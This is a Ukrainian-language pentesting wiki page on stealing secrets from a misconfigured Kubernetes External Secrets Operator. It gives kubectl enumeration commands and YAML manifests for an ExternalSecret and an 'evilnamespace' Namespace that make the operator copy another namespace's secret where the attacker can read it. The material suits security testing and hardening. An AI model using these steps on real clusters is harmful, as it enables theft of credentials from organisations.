# External Secret Operator

**Оригінальний автор цієї сторінки** [**Fares**](https://www.linkedin.com/in/fares-siala/)

Ця сторінка надає кілька вказівок щодо того, як ви можете вкрасти секрети з неправильно налаштованого ESO або програми, яка використовує ESO для синхронізації своїх секретів.

## Відмова від відповідальності

Техніка, показана нижче, може працювати лише за певних обставин. Наприклад, це залежить від вимог, необхідних для дозволу на синхронізацію секрету в просторі імен, яким ви володієте / який ви скомпрометували. Вам потрібно розібратися в цьому самостійно.

## Попередні вимоги

1. Позиція в кластері kubernetes / openshift з адміністративними привілеями на просторі імен
2. Доступ на читання принаймні до ExternalSecret на рівні кластера
3. Визначити, чи є якісь необхідні мітки / анотації або членство в групі, які дозволяють ESO синхронізувати ваш секрет. Якщо вам пощастить, ви зможете вільно вкрасти будь-який визначений секрет.

### Збір інформації про існуючий ClusterSecretStore

Припустимо, що у вас є користувач, який має достатні права для читання цього ресурсу; почніть з переліку існуючих _**ClusterSecretStores**_.
```sh
kubectl get ClusterSecretStore
```
### ExternalSecret enumeration

Припустимо, ви знайшли ClusterSecretStore з назвою _**mystore**_. Продовжте, перераховуючи його асоційовані externalsecret.
```sh
kubectl get externalsecret -A | grep mystore
```
_Цей ресурс має область видимості простору імен, тому, якщо ви ще не знаєте, в якому просторі імен шукати, додайте опцію -A, щоб переглянути всі простори імен._

Ви повинні отримати список визначених externalsecret. Припустимо, ви знайшли об'єкт externalsecret під назвою _**mysecret**_, визначений і використаний простором імен _**mynamespace**_. Зберіть трохи більше інформації про те, який тип секрету він містить.
```sh
kubectl get externalsecret myexternalsecret -n mynamespace -o yaml
```
### Збирання частин

Звідси ви можете отримати назву одного або кількох секретів (таких, як визначено в ресурсі Secret). Ви отримаєте вихідні дані, подібні до:
```yaml
kind: ExternalSecret
metadata:
annotations:
...
labels:
...
spec:
data:
- remoteRef:
conversionStrategy: Default
decodingStrategy: None
key: SECRET_KEY
secretKey: SOME_PASSWORD
...
```
Так що ми отримали:

- Ім'я ClusterSecretStore
- Ім'я ExternalSecret
- Ім'я секрету

Тепер, коли у нас є все необхідне, ви можете створити ExternalSecret (і, зрештою, виправити/створити новий Namespace, щоб відповідати вимогам, необхідним для синхронізації вашого нового секрету):
```yaml
kind: ExternalSecret
metadata:
name: myexternalsecret
namespace: evilnamespace
spec:
data:
- remoteRef:
conversionStrategy: Default
decodingStrategy: None
key: SECRET_KEY
secretKey: SOME_PASSWORD
refreshInterval: 30s
secretStoreRef:
kind: ClusterSecretStore
name: mystore
target:
creationPolicy: Owner
deletionPolicy: Retain
name: leaked_secret
```

```yaml
kind: Namespace
metadata:
annotations:
required_annotation: value
other_required_annotation: other_value
labels:
required_label: somevalue
other_required_label: someothervalue
name: evilnamespace
```
Після кількох хвилин, якщо умови синхронізації були виконані, ви повинні мати можливість переглянути витік секрету у вашому просторі імен.
```sh
kubectl get secret leaked_secret -o yaml
```
## Посилання

{{#ref}}
https://external-secrets.io/latest/
{{#endref}}

{{#ref}}
https://github.com/external-secrets/external-secrets
{{#endref}}
